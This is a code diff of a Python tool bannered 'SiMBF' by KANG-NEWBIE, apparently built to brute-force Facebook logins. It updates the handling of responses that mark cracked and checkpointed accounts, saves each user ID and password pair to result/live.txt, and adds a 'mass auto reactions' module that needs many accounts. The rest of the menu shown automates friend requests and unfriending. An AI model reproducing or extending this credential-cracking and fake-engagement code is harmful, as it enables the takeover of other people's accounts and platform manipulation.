@@ -21,7 +21,7 @@ banner=("""%s
    _____ __  ______  ____
   / __(_)  |/  / _ )/ __/ %sAuthor : KANG-NEWBIE%s
  _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
-/___/_/_/  /_/____/_/     %sversion: %s7.0%s
+/___/_/_/  /_/____/_/     %sversion: %s7.5%s
 """%(c,g,c,g,c,g,y,w))
 
 try:
@@ -128,7 +128,7 @@ def main(arg):
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
-                        live="[found] %s => %s"%(arg,pas)
+                        live="[FOUND] %s|%s"%(arg,pas)
                         tap.append(true)
                         try:
                                 os.mkdir('result')
@@ -137,12 +137,12 @@ def main(arg):
                         tulis="{}\n".format(live)
                         f=open('result/live.txt','a')
                         f.write(tulis)
-                        print("%s[%sfound%s]%s %s -> %s"%(c,g,c,w,arg,pas))
+                        print("%s[%sfound%s]%s %s => %s"%(c,g,c,w,arg,pas))
                         f.close()
                 elif 'checkpoint' in str(respData):
                         true='notbad'
                         cek.append(true)
-                        CP="[checkpoint] %s => %s"%(arg,pas)
+                        CP="[checkpoint] %s|%s"%(arg,pas)
                         try:
                                 os.mkdir('result')
                         except FileExistsError:
@@ -150,10 +150,10 @@ def main(arg):
                         wrt="{}\n".format(CP)
                         f=open('result/live.txt','a')
                         f.write(wrt)
-                        print("%s[%sCpoint%s]%s %s -> %s"%(c,y,c,w,arg,pas))
+                        print("%s[%sCHECK%s]%s %s => %s"%(c,y,c,w,arg,pas))
                         f.close()
                 else:
-                        print("%s[%snot%s]%s %s"%(c,r,c,w,arg))
+                        print("%s[%sNOT%s]%s %s"%(c,r,c,w,arg))
         except: pass
 
 os.system('clear')
@@ -169,6 +169,7 @@ print("""\t[01] start
 \t[09] accept all friends requests
 \t[10] auto add friends from target id
 \t[11] facebook auto unfriends
+\t[12] mass auto reactions
 \t[00] check update""")
 pilih=int(input('\n\t[#] kang-newbie/> '))
 if pilih == 2:
@@ -200,10 +201,14 @@ elif pilih == 10:
 elif pilih == 11:
 	os.system('python src/Unf.py')
 	exit()
+elif pilih == 12:
+	input("[info] before use this module you must have a lot accounts [press enter to continue]")
+	os.system('python src/Mreact.py')
+	exit()
 elif pilih == 00 or pilih == 0:
 	print("\n[!] Checking update")
 	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
-	if 'v.7.5' in str(rr) or 'v.8.0' in str(rr):
+	if 'v.8.0' in str(rr) or 'v.8.5' in str(rr):
 		update()
 	else: exit("[!] already up to date")
 else:
